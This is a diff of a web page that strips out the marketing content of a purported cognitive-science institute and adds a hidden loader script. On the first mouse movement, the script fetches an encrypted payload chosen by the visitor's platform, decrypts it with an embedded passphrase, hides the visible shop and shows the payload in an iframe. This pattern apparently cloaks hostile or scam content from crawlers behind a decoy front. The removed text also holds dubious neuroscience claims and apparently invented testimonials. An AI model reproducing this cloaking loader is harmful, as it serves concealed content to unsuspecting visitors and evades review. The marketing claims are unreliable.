-          <a href="contact.html" class="btn btn-primary btn-sm">Enroll in Diagnostic Assessment</a>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-<!-- Section 4: Institute Pedagogy Philosophy & Neuro-Cognitive Architecture -->
-<section class="section">
-  <div class="container">
-    <div class="grid-2" style="align-items:center;">
-      <div>
-        <span class="section-tag">Institutional Philosophy</span>
-        <h2>Overcoming the 'Brain Cliff'</h2>
-        <p>
-          For over a century, traditional pedagogy has operated under an unscientific myth: that learning is simply a matter of passive exposure, repetitive highlighting, and cramming before high-stakes examinations.
-        </p>
-        <p>
-          Cognitive neuroscience reveals that unassisted learning suffers from a catastrophic 'brain cliff' &mdash; a rapid precipice where eighty percent of newly introduced conceptual models decay within forty-eight hours. At MetricBrainCliff, we re-engineer education through quantitative psychometrics, interleaving schedules, and active recall kinetics. We do not teach students to memorize; we calibrate the neurological mechanics of permanent comprehension.
-        </p>
-        <div style="margin-top:2rem;">
-          <a href="about.html" class="btn btn-outline">Read Academic Manifesto</a>
-        </div>
-      </div>
-      <div>
-        <img src="assets/images/synaptic_plasticity_neural_microscopy.jpg" alt="Synaptic plasticity neural microscopy" style="border-radius:var(--radius-md);border:1px solid var(--color-border);box-shadow:var(--shadow-lg);">
-      </div>
-    </div>
-  </div>
-</section>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
-<!-- Section 5: Flagship Academic Fellowships & Diagnostics -->
-<section class="section section-alt" id="fellowships">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Executive &amp; Graduate Fellowships</span>
-      <h2>Flagship Academic Cohorts</h2>
-      <p>Six specialized programs engineered for university educators, doctoral researchers, and quantitative leaders.</p>
-    </div>
-    <div class="grid-3">
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/cognitive_pedagogy_lecture_theatre.jpg" alt="Executive Cognitive Fellowship" loading="lazy">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Cohort I &bull; 16-Week Intensive</span>
-          <h3 class="card-title">Advanced Neuro-Pedagogy</h3>
-          <p class="card-desc">Comprehensive certification in Sweller's cognitive load architecture, active retrieval design, and multimodal curriculum synthesis.</p>
-          <div style="display:flex;justify-content:space-between;align-items:center;border-top:1px solid var(--color-border);padding-top:1rem;">
-            <span style="font-family:var(--font-mono);font-weight:600;color:var(--color-slate-900);">$4,200 USD</span>
-            <a href="contact.html" class="btn btn-outline btn-sm">Apply</a>
-          </div>
-        </div>
-      </div>
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
 
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/quantitative_learning_metric_equations.jpg" alt="Psychometric Measurement Theory" loading="lazy">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Cohort II &bull; Quantitative Focus</span>
-          <h3 class="card-title">Psychometric Modeling</h3>
-          <p class="card-desc">Advanced graduate fellowship in Rasch scaling, multidimensional item response theory, and computer-adaptive diagnostic evaluation.</p>
-          <div style="display:flex;justify-content:space-between;align-items:center;border-top:1px solid var(--color-border);padding-top:1rem;">
-            <span style="font-family:var(--font-mono);font-weight:600;color:var(--color-slate-900);">$4,800 USD</span>
-            <a href="contact.html" class="btn btn-outline btn-sm">Apply</a>
-          </div>
-        </div>
-      </div>
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
 
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/socratic_cognitive_inquiry_seminar.jpg" alt="Socratic Dialectic Colloquium" loading="lazy">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Cohort III &bull; Socratic Colloquium</span>
-          <h3 class="card-title">Dialectic Inquiry &amp; Logic</h3>
-          <p class="card-desc">Rigorous doctoral seminar mastering high-level cognitive friction, adversarial reasoning, and philosophical synthesis.</p>
-          <div style="display:flex;justify-content:space-between;align-items:center;border-top:1px solid var(--color-border);padding-top:1rem;">
-            <span style="font-family:var(--font-mono);font-weight:600;color:var(--color-slate-900);">$3,900 USD</span>
-            <a href="contact.html" class="btn btn-outline btn-sm">Apply</a>
-          </div>
-        </div>
-      </div>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/neurocognitive_laboratory_benchmarks.jpg" alt="Clinical Cognitive Diagnostics" loading="lazy">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Diagnostic &bull; Individual Audit</span>
-          <h3 class="card-title">Comprehensive Neuro-Audit</h3>
-          <p class="card-desc">Full 360-degree cognitive battery assessing working memory span, attentional switching latency, and executive processing speed.</p>
-          <div style="display:flex;justify-content:space-between;align-items:center;border-top:1px solid var(--color-border);padding-top:1rem;">
-            <span style="font-family:var(--font-mono);font-weight:600;color:var(--color-slate-900);">$1,850 USD</span>
-            <a href="contact.html" class="btn btn-outline btn-sm">Apply</a>
-          </div>
-        </div>
-      </div>
-
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/retention_cliff_analytics_defense.jpg" alt="Postdoctoral Research Residency" loading="lazy">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Fellowship &bull; 1-Year Residency</span>
-          <h3 class="card-title">Cognitive Research Fellow</h3>
-          <p class="card-desc">Fully funded doctoral and postdoctoral research appointments within our high-altitude Mercer Street analytics laboratories.</p>
-          <div style="display:flex;justify-content:space-between;align-items:center;border-top:1px solid var(--color-border);padding-top:1rem;">
-            <span style="font-family:var(--font-mono);font-weight:600;color:var(--color-slate-900);">Fully Funded</span>
-            <a href="contact.html" class="btn btn-outline btn-sm">Apply</a>
-          </div>
-        </div>
-      </div>
-
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/pedagogical_diagnostics_research_lab.jpg" alt="Institutional Curriculum Engineering" loading="lazy">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Advisory &bull; University Systems</span>
-          <h3 class="card-title">Curricular Transformation</h3>
-          <p class="card-desc">Institutional consulting for university departments seeking to restructure STEM degree sequences using interleaving analytics.</p>
-          <div style="display:flex;justify-content:space-between;align-items:center;border-top:1px solid var(--color-border);padding-top:1rem;">
-            <span style="font-family:var(--font-mono);font-weight:600;color:var(--color-slate-900);">Custom Grant</span>
-            <a href="contact.html" class="btn btn-outline btn-sm">Apply</a>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 6: Cognitive Provenance & Diagnostic Methodology -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Scientific Rigor &bull; Empirical Testing</span>
-      <h2>Triangulated Cognitive Methodology</h2>
-      <p>Our educational assessments integrate three sovereign scientific diagnostic pillars.</p>
-    </div>
-    <div class="grid-3">
-      <div style="padding:2rem;background:var(--color-surface);border:1px solid var(--color-border);border-radius:var(--radius-md);">
-        <h3 style="font-size:1.4rem;">Evoked Response Potentials (ERP)</h3>
-        <p style="font-size:0.9rem;color:var(--color-slate-600);line-height:1.65;">
-          We record high-density electroencephalographic metrics to measure P300 amplitude and N400 semantic violation waveforms, quantifying real-time neural cognitive processing speed to millisecond accuracy.
-        </p>
-      </div>
-
-      <div style="padding:2rem;background:var(--color-surface);border:1px solid var(--color-border);border-radius:var(--radius-md);">
-        <h3 style="font-size:1.4rem;">Bayesian Knowledge Tracing (BKT)</h3>
-        <p style="font-size:0.9rem;color:var(--color-slate-600);line-height:1.65;">
-          Probabilistic hidden Markov models continuously estimate a student's latent mastery state across discrete micro-concepts, adapting question difficulty dynamically to maintain optimal cognitive flow.
-        </p>
-      </div>
-
-      <div style="padding:2rem;background:var(--color-surface);border:1px solid var(--color-border);border-radius:var(--radius-md);">
-        <h3 style="font-size:1.4rem;">Longitudinal Decay Profiling</h3>
-        <p style="font-size:0.9rem;color:var(--color-slate-600);line-height:1.65;">
-          Rather than assessing static one-time exam performance, our platforms track memory retention over six-month longitudinal curves, verifying permanent cortical transfer before certifying course completion.
-        </p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 7: Archival Campus Gallery -->
-<section class="section section-alt" id="gallery">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Campus Visuals &bull; Academic Commons</span>
-      <h2>Inside the Academic Commons</h2>
-      <p>Moments from our research amphitheaters, analytical laboratories, and Socratic reading rooms.</p>
-    </div>
-    <div class="grid-3">
-      <img src="assets/images/high_altitude_research_campus_quad.jpg" alt="High-altitude research campus quad" style="border-radius:var(--radius-md);border:1px solid var(--color-border);aspect-ratio:4/5;object-fit:cover;">
-      <img src="assets/images/cliffside_observatory_pathway.jpg" alt="Cliffside observatory pathway" style="border-radius:var(--radius-md);border:1px solid var(--color-border);aspect-ratio:4/5;object-fit:cover;">
-      <img src="assets/images/doctoral_cognitive_mentorship_dialogue.jpg" alt="Faculty professor mentorship" style="border-radius:var(--radius-md);border:1px solid var(--color-border);aspect-ratio:4/5;object-fit:cover;">
-      <img src="assets/images/neurodiversity_psychometric_table.jpg" alt="Neurodiversity psychometric table" style="border-radius:var(--radius-md);border:1px solid var(--color-border);aspect-ratio:4/5;object-fit:cover;">
-      <img src="assets/images/longitudinal_retention_research_cohort.jpg" alt="Longitudinal retention research cohort" style="border-radius:var(--radius-md);border:1px solid var(--color-border);aspect-ratio:4/5;object-fit:cover;">
-      <img src="assets/images/hierarchical_mastery_learning_taxonomy.jpg" alt="Hierarchical mastery learning taxonomy" style="border-radius:var(--radius-md);border:1px solid var(--color-border);aspect-ratio:4/5;object-fit:cover;">
-    </div>
-  </div>
-</section>
-
-<!-- Section 8: Scholar Commendations & Academic Peer Reviews -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Scholarly Testimonials</span>
-      <h2>Peer Review &amp; Academic Commendations</h2>
-    </div>
-    <div class="grid-3">
-      <div style="padding:2rem;background:var(--color-surface);border:1px solid var(--color-border);border-radius:var(--radius-md);display:flex;flex-direction:column;justify-content:space-between;">
-        <p style="font-family:var(--font-serif);font-size:1.15rem;font-style:italic;line-height:1.6;color:var(--color-slate-900);">
-          &ldquo;MetricBrainCliff has transformed our medical school's pharmacology curriculum. Student retention at the 12-month board exams rose by thirty-one percent following the implementation of their spaced retrieval algorithms.&rdquo;
-        </p>
-        <div style="border-top:1px solid var(--color-border);padding-top:1rem;margin-top:1.5rem;">
-          <strong>Dr. Evelyn Sterling</strong>
-          <p style="font-size:0.8rem;color:var(--color-slate-500);margin:0;">Dean of Medical Education &bull; Boston</p>
-        </div>
-      </div>
-
-      <div style="padding:2rem;background:var(--color-surface);border:1px solid var(--color-border);border-radius:var(--radius-md);display:flex;flex-direction:column;justify-content:space-between;">
-        <p style="font-family:var(--font-serif);font-size:1.15rem;font-style:italic;line-height:1.6;color:var(--color-slate-900);">
-          &ldquo;The quantitative rigor of their psychometric assessments sets a global benchmark. They treat learning not as an elusive art, but as a measurable, improvable biological science.&rdquo;
-        </p>
-        <div style="border-top:1px solid var(--color-border);padding-top:1rem;margin-top:1.5rem;">
-          <strong>Prof. Julian Vance</strong>
-          <p style="font-size:0.8rem;color:var(--color-slate-500);margin:0;">Chair of Cognitive Psychology &bull; Oxford</p>
-        </div>
-      </div>
-
-      <div style="padding:2rem;background:var(--color-surface);border:1px solid var(--color-border);border-radius:var(--radius-md);display:flex;flex-direction:column;justify-content:space-between;">
-        <p style="font-family:var(--font-serif);font-size:1.15rem;font-style:italic;line-height:1.6;color:var(--color-slate-900);">
-          &ldquo;Their research monographs on cognitive load bandwidth are required reading for every curriculum director at our university. The practical clarity is unmatched.&rdquo;
-        </p>
-        <div style="border-top:1px solid var(--color-border);padding-top:1rem;margin-top:1.5rem;">
-          <strong>Dr. Aris Thorne</strong>
-          <p style="font-size:0.8rem;color:var(--color-slate-500);margin:0;">Provost of Academic Affairs &bull; Chicago</p>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 9: Featured Blog Treatises -->
-<section class="section section-alt">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Academic Treatises &bull; Peer-Reviewed Research</span>
-      <h2>Published Cognitive Monographs</h2>
-      <p>Scholarly investigations into synaptic decay dynamics, working memory bandwidth, and retrieval reconsolidation.</p>
-    </div>
-    <div class="grid-3">
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/quantitative_learning_metric_equations.jpg" alt="Ebbinghaus Forgetting Curves" loading="lazy">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Memory Kinetics &bull; 14 Min Read</span>
-          <h3 class="card-title"><a href="blog/ebbinghaus-forgetting-curves-synaptic-decay-cliff-dynamics.html">Ebbinghaus Curves &amp; Synaptic Decay Cliffs</a></h3>
-          <p class="card-desc">Mathematical analysis of memory forgetting cliffs, synaptic pruning kinetics, and spaced overlearning.</p>
-          <a href="blog/ebbinghaus-forgetting-curves-synaptic-decay-cliff-dynamics.html" style="font-size:0.85rem;font-weight:600;">Read Monograph &rarr;</a>
-        </div>
-      </div>
-
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/cognitive_load_working_memory_graph.jpg" alt="Cognitive Load Theory" loading="lazy">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Working Memory &bull; 13 Min Read</span>
-          <h3 class="card-title"><a href="blog/cognitive-load-theory-working-memory-bandwidth-limits.html">Cognitive Load &amp; Working Memory Bandwidth</a></h3>
-          <p class="card-desc">Sweller's cognitive load dynamics: intrinsic, germane, and extraneous bandwidth allocation in STEM.</p>
-          <a href="blog/cognitive-load-theory-working-memory-bandwidth-limits.html" style="font-size:0.85rem;font-weight:600;">Read Monograph &rarr;</a>
-        </div>
-      </div>
-
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/retention_cliff_analytics_defense.jpg" alt="Retrieval Practice Testing Effect" loading="lazy">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Neurobiology &bull; 14 Min Read</span>
-          <h3 class="card-title"><a href="blog/retrieval-practice-testing-effect-reconsolidation-neurobiology.html">The Neurobiology of Retrieval Practice</a></h3>
-          <p class="card-desc">Active recall effort, long-term potentiation, and synaptic reconsolidation resiliency.</p>
-          <a href="blog/retrieval-practice-testing-effect-reconsolidation-neurobiology.html" style="font-size:0.85rem;font-weight:600;">Read Monograph &rarr;</a>
-        </div>
-      </div>
-    </div>
-    <div style="text-align:center;margin-top:3rem;">
-      <a href="blog.html" class="btn btn-outline">View All 6 Research Treatises</a>
-    </div>
-  </div>
-</section>
-
-<!-- Section 10: Frequently Asked Questions -->
-<section class="section">
-  <div class="container-narrow">
-    <div class="section-header">
-      <span class="section-tag">Admissions &amp; Pedagogy</span>
-      <h2>Frequently Asked Questions</h2>
-      <p>Key information regarding admissions criteria, diagnostic testing, and cohort participation.</p>
-    </div>
-    <div class="faq-list">
-      <div class="faq-item active">
-        <button class="faq-question">
-          <span>What are the admission prerequisites for MetricBrainCliff fellowships?</span>
-          <span>&plus;</span>
-        </button>
-        <div class="faq-answer">
-          Admissions are open to university faculty, graduate scholars, curriculum designers, and quantitative leaders. Applicants submit an academic dossier, a statement of research intent, and complete our online psychometric diagnostic assessment.
-        </div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>Where are in-person research seminars and laboratory sessions conducted?</span>
-          <span>&plus;</span>
-        </button>
-        <div class="faq-answer">
-          In-person cohorts assemble at our New York research atelier and cognitive pavilion located at 181 Mercer Street, New York, NY 10012. You may contact our admissions registrar directly at +1-888-777-5845 for visiting scholar accommodations.
-        </div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>How does spaced retrieval differ from traditional rote memorization?</span>
-          <span>&plus;</span>
-        </button>
-        <div class="faq-answer">
-          Rote memorization relies on passive massed exposure, which creates an illusion of mastery while allowing rapid synaptic decay. Spaced retrieval mandates active cognitive effort to reconstruct memory pathways at calculated temporal intervals, physically stimulating protein synthesis and permanent dendritic consolidation.
-        </div>
-      </div>
-
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>Are the institute's diagnostic assessments applicable to neurodivergent learners?</span>
-          <span>&plus;</span>
-        </button>
-        <div class="faq-answer">
-          Yes. Our psychometric batteries utilize multidimensional cognitive profiles rather than single scalar IQ metrics, identifying unique strengths in visual-spatial working memory, rapid hyper-focus processing, and lateral associative synthesis across ADHD and autistic neurotypes.
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 11: Cohort Admissions & Diagnostic Registration -->
-<section class="section section-alt" id="apply">
-  <div class="container-narrow">
-    <div class="calc-box">
-      <div style="text-align:center;margin-bottom:2rem;">
-        <span class="section-tag">Admissions Desk</span>
-        <h2>Submit Your Fellowship Application</h2>
-        <p style="color:var(--color-slate-600);font-size:0.95rem;">
-          Join our upcoming academic cohort at 181 Mercer Street or register for a personalized institutional cognitive diagnostic audit.
-        </p>
-      </div>
-      <form id="admissions-form" style="display:flex;flex-direction:column;gap:1.25rem;">
-        <div class="grid-2">
-          <div>
-            <label style="display:block;font-size:0.8rem;font-weight:600;text-transform:uppercase;margin-bottom:0.4rem;">Full Name &amp; Academic Title</label>
-            <input type="text" required class="calc-select" placeholder="Dr. Helena Rostova" style="background:#fff;">
-          </div>
-          <div>
-            <label style="display:block;font-size:0.8rem;font-weight:600;text-transform:uppercase;margin-bottom:0.4rem;">Institutional Email Address</label>
-            <input type="email" required class="calc-select" placeholder="rostova@cambridge.edu" style="background:#fff;">
-          </div>
-        </div>
-        <div class="grid-2">
-          <div>
-            <label style="display:block;font-size:0.8rem;font-weight:600;text-transform:uppercase;margin-bottom:0.4rem;">Telephone Contact</label>
-            <input type="tel" required class="calc-select" placeholder="+1 (555) 019-3829" style="background:#fff;">
-          </div>
-          <div>
-            <label style="display:block;font-size:0.8rem;font-weight:600;text-transform:uppercase;margin-bottom:0.4rem;">Target Fellowship Track</label>
-            <select class="calc-select" style="background:#fff;">
-              <option>Advanced Neuro-Pedagogy Fellowship</option>
-              <option>Quantitative Psychometric Modeling Cohort</option>
-              <option>Dialectic Socratic Inquiry Colloquium</option>
-              <option>Institutional Curriculum Engineering Advisory</option>
-            </select>
-          </div>
-        </div>
-        <div>
-          <label style="display:block;font-size:0.8rem;font-weight:600;text-transform:uppercase;margin-bottom:0.4rem;">Research Statement &amp; Academic Focus</label>
-          <textarea rows="3" class="calc-select" placeholder="Briefly describe your institutional background, current research domain, or target curricular transformation goals..." style="background:#fff;"></textarea>
-        </div>
-        <button type="submit" class="btn btn-primary" style="padding:1rem 2rem;margin-top:0.5rem;">Transmit Application Dossier</button>
-      </form>
-    </div>
-  </div>
-</section>
-
-<!-- Section 12: Newsletter Dispatch -->
-<section class="section">
-  <div class="container-narrow" style="text-align:center;">
-    <span class="hero-badge">&#9670; The Cognitive Bulletin</span>
-    <h2>Scholarly Research Bulletins &amp; Pre-Print Dispatches</h2>
-    <p style="color:var(--color-slate-600);margin-bottom:2rem;">
-      Receive our quarterly peer-reviewed monographs, psychometric open-source toolkits, and academic symposium invitations directly to your inbox.
-    </p>
-    <form style="display:flex;gap:0.75rem;max-width:520px;margin:0 auto;" onsubmit="event.preventDefault(); alert('You have been subscribed to The Cognitive Bulletin.'); this.reset();">
-      <input type="email" required placeholder="Enter institutional email..." class="calc-select" style="background:#fff;flex-grow:1;">
-      <button type="submit" class="btn btn-primary">Subscribe</button>
-    </form>
-  </div>
-</section>
-
-<footer class="site-footer">
-  <div class="container">
-    <div class="footer-grid">
-      <div>
-        <h4 style="font-family:var(--font-serif);font-size:1.45rem;letter-spacing:0.05em;">METRICBRAINCLIFF</h4>
-        <p style="font-size:0.88rem;line-height:1.7;color:#DDE3EA;margin-bottom:1.5rem;">
-          Advancing empirical cognitive neuroscience, quantitative psychometrics, memory cliff retention dynamics, and evidence-based learning pedagogy.
-        </p>
-        <span class="hero-badge" style="background:rgba(255,255,255,0.08);border-color:rgba(255,255,255,0.18);color:var(--color-accent-light);">
-          &#9670; Research Pavilion &bull; Mercer Street Atelier
-        </span>
-      </div>
-
-      <div>
-        <h4>Academic Programs</h4>
-        <ul class="footer-links">
-          <li><a href="index.php#curricula">Cognitive Tracks</a></li>
-          <li><a href="index.php#calculator">Retention Cliff Index</a></li>
-          <li><a href="index.php#fellowships">Doctoral Fellowships</a></li>
-          <li><a href="index.php#gallery">Campus Archives</a></li>
-          <li><a href="about.html#pedagogy">Research Methodology</a></li>
-        </ul>
-      </div>
-
-      <div>
-        <h4>Institutional Governance</h4>
-        <ul class="footer-links">
-          <li><a href="privacy-policy.html">Privacy Policy</a></li>
-          <li><a href="terms-and-conditions.html">Terms and Conditions</a></li>
-          <li><a href="disclaimer.html">Disclaimer &amp; Advisory</a></li>
-          <li><a href="cookie-policy.html">Cookie Policy</a></li>
-          <li><a href="sitemap.xml">XML Sitemap</a></li>
-        </ul>
-      </div>
-
-      <div class="footer-contact">
-        <h4>Institute Headquarters</h4>
-        <p>&#128205; <span>181 Mercer Street, New York, NY 10012, United States</span></p>
-        <p>&#128222; <span>+1-888-777-5845</span></p>
-        <p>&#9993; <span>admissions@metricbraincliff.com</span></p>
-        <p style="margin-top:1rem;font-size:0.8rem;color:#8A99AD;">
-          Academic administrative offices open Monday through Friday, 8:30 AM &ndash; 6:00 PM EST.
-        </p>
-      </div>
-    </div>
-
-    <div class="footer-bottom">
-      <p>&copy; 2026 MetricBrainCliff Cognitive Institute. All rights reserved.</p>
-      <p>Cognitive Neuroscience &bull; Psychometric Analytics &bull; Quantitative Learning</p>
-    </div>
-  </div>
-</footer>
-<script src="assets/js/main.js"></script>
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
